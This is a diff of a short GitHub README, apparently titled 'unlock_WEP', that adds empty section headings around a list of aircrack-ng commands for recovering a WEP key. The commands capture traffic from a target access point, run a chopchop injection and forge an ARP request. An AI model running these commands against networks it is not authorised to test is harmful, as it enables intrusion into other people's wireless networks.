@@ -1,11 +1,17 @@
 # unlock_WEP
 Steps to unlock WEP key using aircrack
 
-# Category
+## Category
 
 WiFi Security
 
-# Requirements
+## Description
+
+## Demo in Animation
+
+## Overview
+
+## Requirements
 
 Make sure to know following information.
 
@@ -17,7 +23,10 @@ TARGET-BSSID(MAC)
 
 YOUR-BSSID(MAC)
 
-# How to
+
+## Install
+
+## Usage
 
 `airodump-ng --channel 7 --bssid TARGET-BSSID(MAC) -w /var/tmp/wifidata wlan0`
 
@@ -30,3 +39,15 @@ YOUR-BSSID(MAC)
 `aireplay-ng -4 -h YOUR-BSSID(MAC) -b TARGET-BSSID(MAC) wlan0`
 
  `packetforge-ng -0 -a TARGET-BSSID(MAC) -h YOUR-BSSID(MAC) -k 255.255.255.255 -l 255.255.255.255 -y fragment-0203-180343.xor -w arp-request`
+ 
+
+## Contribution
+
+## Updates
+
+## Licence
+[MIT]
+
+## Author
+
+[linuxkay](https://github.com/linuxkay)
